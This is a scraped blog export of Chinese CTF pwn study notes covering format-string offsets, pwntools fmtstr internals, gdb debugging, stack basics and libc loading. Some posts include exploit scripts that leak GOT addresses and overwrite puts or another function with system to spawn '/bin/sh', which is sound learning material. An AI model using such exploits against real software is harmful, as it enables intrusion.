fmtstr功能源码剖析","slug":"格式化字符串偏移计算原理","date":"2021-10-27T08:36:07.912Z","updated":"2021-11-05T06:41:20.199Z","comments":true,"path":"2021/10/27/格式化字符串偏移计算原理/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/","excerpt":"","text":"重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现 1）32位偏移计算原理​ 其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。 ​ 准确来说应该是格式化字符串在栈上的偏移。 ​ 原理也比较简单。x86架构下，格式化字符串时通过栈传递的。 ​ 然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。 ​ 举一个例子，源码来源于3.1.1 格式化字符串漏洞 //test1.c #include&lt;stdio.h&gt; void main() { printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\"); } ​ 这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。 ​ 我们以32位编译。 gcc -m32 test1.c -o test1 ​ 在main函数处下一个断点。然后执行到断点处。 ​ 随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从stack 部分我们可以看到，此时栈里已经有一个参数”\\n”。 ​ 继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。 ​ 可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子： ​ 然后回忆一下被调函数参数和局部变量压栈的过程： ​ 主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。 ​ 这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。 2）64位偏移计算原理​ 原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。 3） pwntools_fmtstr工具​ 在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。 ​ pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。 例子​ 例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。 from pwn import * elf = ELF('./') r = process('./') libc = ELF('/') # 计算偏移量 def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset # 获得 func 的 got 地址 func_got = elf.got['func']#func通常是一些例如printf或puts的函数 log.success(\"func_got =&gt; {}\".format(hex(func_got))) # 获得 func 的真实地址 payload = p32(func_got) + '%{}$s'.format(offset) r.send(payload) func_addr = u32(r.recv()[4:8]) log.success(\"func_addr =&gt; {}\".format(hex(func_addr))) # 获得 system 的真实地址 system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system']) log.success(\"system_addr =&gt; {}\".format(hex(system_addr))) payload = fmtstr_payload(offset, {func_got : system_addr}) r.send(payload) r.send('/bin/sh') r.recv() r.interactive() ​ ​ 其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。 源码分析​ pwntools定义了一个FmtStr类，来实现格式化字符串漏洞的利用。 ​ ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是： ​ 所以下图中的代码也就能够理解了，就是将参数传入实例本身。 ​ 然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。 ​ 很显然这个功能的实现是基于find_offset方法。 ​ 方法的内容其实比较简单： def find_offset(self): marker = cyclic(20)#cyclic 20个字符 for off in range(1,1000):#从1-1000，爆破偏移量 leak = self.leak_stack(off, marker) leak = pack(leak)#leak = p(leak_stack) pad = cyclic_find(leak[:4]) if pad &gt;= 0 and pad &lt; 20: return off, pad else: log.error(\"Could not find offset to format string on stack\") return None, None ​ 而实现方法find_offset，又依靠方法leak_stack def leak_stack(self, offset, prefix=b\"\"): payload = b\"START%%%d$pEND\" % offset leak = self.execute_fmt(prefix + payload) try: leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0] leak = int(leak, 16) except ValueError: leak = 0 return leak ​ cyclic的代码也顺便放一放（ def cyclic_find(subseq, alphabet = None, n = None): if n is None: n = context.cyclic_size if isinstance(subseq, six.integer_types): subseq = packing.pack(subseq, bytes=n) subseq = packing._need_bytes(subseq, 2, 0x80) if len(subseq) != n: log.warn_once(\"cyclic_find() expects %i-byte subsequences by default, you gave %r\\n\" \"Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n\" \"Truncating the data at 4 bytes. Specify cyclic_find(..., n=%i) to override this.\", n, subseq, len(subseq), len(subseq)) subseq = subseq[:n] if alphabet is None: alphabet = context.cyclic_alphabet alphabet = packing._need_bytes(alphabet, 2, 0x80) if any(c not in alphabet for c in subseq): return -1 n = n or len(subseq) return _gen_find(subseq, de_bruijn(alphabet, n)) ​ 之前一直对cyclic的实现抱有兴趣，抽个时间可以看看源码分析。 ​ ​ 4）总结​ part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。 ​ 主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。 ​ 通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。 ​ 然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？ 5）参考​ pwnlib.fmtstr— Format string bug exploitation tools ​ 格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测 ​ pwntools中fmtstr的使用 ​ 3.1.1 格式化字符串漏洞 ​ Python中self用法详解","categories":[],"tags":[{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"}]},{"title":"pwntools(1)-- pwnlib.tube","slug":"pwntools（1）--pwnlib.tube","date":"2021-10-27T03:21:54.156Z","updated":"2021-10-31T15:04:35.146Z","comments":true,"path":"2021/10/27/pwntools（1）--pwnlib.tube/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/","excerpt":"","text":"0)preview​ 一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入： from pwn import* ​ 我也如此。 ​ 在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。 ​ 这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。 ​ 第一部分，则是一个至关重要的part–pwnlib.tube 1)进程间通信​ 在了解pwnlib.tube之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》 ​ tbc… ​","categories":[],"tags":[{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"}]},{"title":"gdb附加调试的一些黑魔法","slug":"gdb附加调试的一些黑魔法","date":"2021-10-27T03:21:25.650Z","updated":"2021-11-09T06:55:26.656Z","comments":true,"path":"2021/10/27/gdb附加调试的一些黑魔法/","link":"","permalink":"https://fuurinko.github.io/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","excerpt":"","text":"1）abstract​ 这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。 2）格式化字符串-cctf-pwn31）pause（p）导致ERROR: Could not find ELF base问题​ 在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样： Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837 Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done. ERROR: Could not find ELF base! done. Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done. done. Cannot access memory at address 0xf7fad924 warning: Unable to find dynamic linker breakpoint function. GDB will be unable to debug shared library initializers and track explicitly loaded dynamic code. Failed to read a valid object file image from memory. ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! 0xf7f85b59 in ?? () ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ERROR: Could not find ELF base! ​ 首先需要知道这个报错的原因。 ​ 虽然我并没有查到ERROR: Could not find ELF base!这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。 ​ 那么进程中止的原因何在？ 解决方案​ 经过大师指点，这个问题其实是因为exp错误（ ​ 这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是elf base not found。 总结​ 如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。 3）__kernel_vsyscall？问题​ 上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在__kernel_vsyscall这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。 ​ 我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么__kernel_vsyscall是一个怎样的函数，为什么偏偏就断在它的身上呢？ 解决​ 在stackoverflow上，我们能够看出一些端倪。 ​ __kernel_vsyscal is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the sysenter instruction. ​ 这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。 ​ 所以出现 __kernel_vsyscal 意味着此刻程序正在进行系统调用。我们同时可以注意到，当 __kernel_vsyscal 函数执行完成，下一个函数则是read函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。 当然要结束这个函数我们只需要gdb finish。 或者直接使用gdb.attach(sh,”break xxx”)。 关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见： 4）gdb附加调试下断点的几种姿势。1）gdb.attach(p)2）gdb.attach(p,”break &lt;func name&gt;”)3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )5）p = gdb.debug(“elf”,”break &lt;func name&gt;” ) ​ 6）Linux Signal​ 在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图 ​ 感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。 ​ 在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。 ​ signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。 ​ csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。 ​ ​ 实际的信号不止这三十种。但是一般来说就是这些。 ）参考如何做到一边使用pwntools一边使用gdb下断点到main函数前","categories":[],"tags":[{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"}]},{"title":"格式化字符串漏洞学习","slug":"格式化字符串漏洞利用","date":"2021-10-23T07:05:16.822Z","updated":"2021-11-05T06:41:10.950Z","comments":true,"path":"2021/10/23/格式化字符串漏洞利用/","link":"","permalink":"https://fuurinko.github.io/2021/10/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"","text":"1）前言绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。 首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。 所以碰到这道题，算是又给我敲了第nn个警钟。 非常清晰地告诉我：我是垃圾。 2）格式化字符串基本原理ctfwiki上的格式化字符串教程写得挺好的，可以参考。 格式化字符串参数%[parameter][flags][field width][.precision][length]type parameter n$，获取格式化字符串中的指定参数 flag field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 格式化字符串漏洞利用一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。 一般来说不正确的方式有这几种 一直%s，容易引用不合法的地址，造成程序崩溃 通过打印的相关内存信息，泄露内存布局，获得有用的信息 3)例1:goodluck话不多说，直接上例子。 程序逻辑分析第一步，清晰而准确的逆向是漏洞点利用的基础。 首先，程序读取flag，通过_IO_getc(fp)，一个字符一个字符地将flag读入v10。 然后将flag的首地址给v9。 然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（ 然后看一个关于fflush的详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） 但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。 bss段存储未初始化的全局变量，也不是缓冲区吧。 缓冲区从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。 为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，cingetchar函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。 缓冲区的分类1:全缓冲。只有在缓冲区被填满之后才会进行I/O操作；最典型的全缓冲就是对磁盘文件的读写。 2:行缓冲只有在输入或者是输出中遇到换行符的时候才会进行I/O操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做I/O操作。一般来说，标准输入流(stdin)和标准输出流(stdout)是行缓冲 3:无缓冲 无缓冲；标准I/O不缓存字符；其中表现最明显的就是标准错误输出流(stderr)，这使得出错信息尽快的返回给用户。 （我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错） fflush函数然后是关于fflush函数的glibc源码。 fflush实际是调用vtable中的函数_IO_new_file_sync，这个函数的源码如图： （/glibc-2.23/libio/fileops.c:867） int _IO_new_file_sync (_IO_FILE *fp) { _IO_ssize_t delta; int retval = 0; /* char* ptr = cur_ptr(); */ if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) if (_IO_do_flush(fp)) return EOF;//end of file delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end; if (delta != 0) { #ifdef TODO if (_IO_in_backup (fp)) delta -= eGptr () - Gbase (); #endif _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1); if (new_pos != (_IO_off64_t) EOF) fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr; #ifdef ESPIPE else if (errno == ESPIPE) ; /* Ignore error from unseekable devices. */ #endif else retval = EOF; } if (retval != EOF) fp-&gt;_offset = _IO_pos_BAD; /* FIXME: Cleanup - can this be shared? */ /* setg(base(), ptr, ptr); */ return retval; } libc_hidden_ver (_IO_new_file_sync, _IO_file_sync) 虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。 pwntools与缓冲区机制某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。 为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见pwntools源码剖析（1）–以源码的角度分析io交互原理 %ms？从缓冲区的研究回到程序的简单逻辑分析上。 __isoc99_scanf(\"%ms\", &amp;format); 接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里） 然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。 漏洞利用因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。 那么如何打印这个flag呢？ 我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。 flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。 这时候就需要计算这个flag字符串与栈顶的偏移。 ![截屏2021-10-26 下午10.35.39](/Users/rin/Library/Application Support/typora-user-images/截屏2021-10-26 下午10.35.39.png) 显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。 利用%n$s打印参数，即可获得flag。 4)例2经过刚才的开胃菜，我们总算进入了正题。 一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。 但是如果需要修改函数的got表，我们需要满足几个条件： 知道需要修改的函数的真实地址。 需要想办法改写函数的got表。 一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（ 回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子 cctf pwn3程序分析 程序逻辑分析还是先进行一个简单的逻辑分析。 首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。 所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。 当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。 首先我们确定字符串偏移。 gdb动调的一些坑用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成 ERROR: Could not find ELF base! 原因详见摆烂第四天–gdb附加调试的一些黑魔法的2.1节。 因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。 等问题解决了在再来调。 tmp = 'sysbdmin' name = \"\" for i in tmp: name += chr(ord(i) - 1) ## password def password(): sh.recvuntil('Name (ftp.hacker.server:Rainism):') sh.sendline(name) 绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。 这样就有了代码中的公式。 当我们绕过了密码，然后就需要打印puts函数的真实地址。 打印真实地址，第一步需要找到格式化字符串在栈中的偏移。 关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。 原理参见：格式化字符串偏移计算原理 这里的偏移是8 # get the addr of puts puts_got = pwn3.got['puts'] log.success('puts got : ' + hex(puts_got)) put(b'1111', b'%8$s' + p32(puts_got)) puts_addr = u32(get('1111')[:4]) 然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。 这里%8$s' + p32(puts_got)应该是先把puts的got表传进去，然后再通过%8$s打印。 然后接收信息，就是puts的got表。 然后就是经典rop的确定libc基址和system地址，比较套路。 下一个关键点是 payload = fmtstr_payload(7, {puts_got: system_addr}) put('/bin/sh;', payload) sh.recvuntil('ftp&gt;') sh.sendline('get') sh.recvuntil('enter the file name you want to get:') ##gdb.attach(sh) sh.sendline('/bin/sh;') ​ 这里其实主要的问题都是被fmtstr_payload函数解决了。 ​ 这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。 ​ 关于函数是如何实现的，可以参见另外一篇笔记。格式化字符串偏移计算原理 最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。 ​ ​ 这个题的调试部分才是大头，一点一点把问题解决吧。 调试部分​ 思路和exp都很清楚的情况下，我们尝试对题目进行调试。 参考缓冲区机制详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） difference between %ms and %s scanf 格式化字符串 [格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)","categories":[],"tags":[{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"}]},{"title":"pwn基础","slug":"pwn基础","date":"2021-10-13T09:25:43.372Z","updated":"2021-11-18T02:27:27.160Z","comments":true,"path":"2021/10/13/pwn基础/","link":"","permalink":"https://fuurinko.github.io/2021/10/13/pwn%E5%9F%BA%E7%A1%80/","excerpt":"","text":"[TOC] 汇编语言1）寻址1/直接寻址mov rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。 2/间接寻址间接在使用指针以及解引用的形式 mov [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。 3/比例寻址例如在数组遍历中 .data arrayD 1,2,3,4 .code mov esi,3 mov eax,arrayD[esi*4] ;eax = 4 其中，比例因子“4”代表数组的元素个数，esi的值代表下标。 2）段寄存器其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h 3）基础指令1/数据传输mov为了实现各种数据的传输，mov还有一下几种派生指令 movzx对目的操作数进行全0拓展并且复制。 movsx同上，但是是用1拓展而不是0。 与数据传输相关的指令还有很多，以后待补充。 2/与数据相关的运算符和伪指令offset返回一个偏移量 align将一个变量对齐到边界。 ps：对于cpu来说，处理偶地址速度会快于奇地址。 ptr重写一个已经被声明过操作数的大小类型。 type返回变量单个元素的大小 lengthof计算数组中元素的个数 sizeof返回lengthof和type的乘积 函数调用栈从一个简单的程序入手。 程序来自你邮萌新赛pwn1-人类补习计划。 ​ 可以看到对栈空间进行一个初始化的操作的三行关键代码。 push rbp mov rbp, rsp sub rsp, 30h 然后就是人神共愤的函数调用栈环节。 rbp ： 栈基址指针寄存器 。 rsp ： 栈顶指针寄存器。 ​ 之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。 ​ 并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。 ​ 值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。 ​ ebp也就是s的位置，很显然在esp之下。 ​ 然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。 主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 这段话说得非常玄学，而csapp中说得就非常简单清晰 当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。 ​ 还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。 ​ 那么直接从动态调试的角度来研究函数调用栈。 ​ 关于压栈的一些传参方式，可以参见格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。 当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。 此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。 可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。 tbc","categories":[],"tags":[{"name":"pwn Primary","slug":"pwn-Primary","permalink":"https://fuurinko.github.io/tags/pwn-Primary/"}]},{"title":"ubuntu加载不同版本libc","slug":"ubuntu加载不同版本libc","date":"2021-08-17T02:53:00.000Z","updated":"2021-10-29T06:01:03.125Z","comments":true,"path":"2021/08/17/ubuntu加载不同版本libc/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","excerpt":"","text":"1）review 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。 然后我就是这样一步一步地变得不会调试的。 但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。 呜呜呜，我居然一直忽略了它的灵魂 所以这一次我一定要解决掉这个问题。 之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。 目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。 2）原理在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。 但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。 1）LD_PRELOAD首先就是我们在脚本前加载的LD_PRELOAD这个东西。一般的用法是env={\"LD_PRELOAD\":libc_path} 它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。 这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 换句话说我们可以通过指定这个环境变量来指定特定的libc版本。 2）LD_LIBRARY_PATH和LIBRARY_PATHLD_LIBRARY_PATH用于在程序加载运行期间查找动态链接库时指定除了系统默认路径之外的其他路径. LIBRARY_PATH环境变量用于在程序编译期间查找动态链接库时指定查找共享库的路径 其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。 并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以LD_PRELOAD还是比较常见。 相关（？）环境变量大概就这么多，然后是某些特殊的段。 1） PT_INTERP储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。 我们可以修改这个段的内容来指定我们需要的链接器。 汇总综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。 准备好了以后我们通过脚本将题目PT_INTERP段修改，然后通过LD_PRELOAD指定我们需要的libc的路径即可。 实际操作我们以lonelywolf为例。 有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。 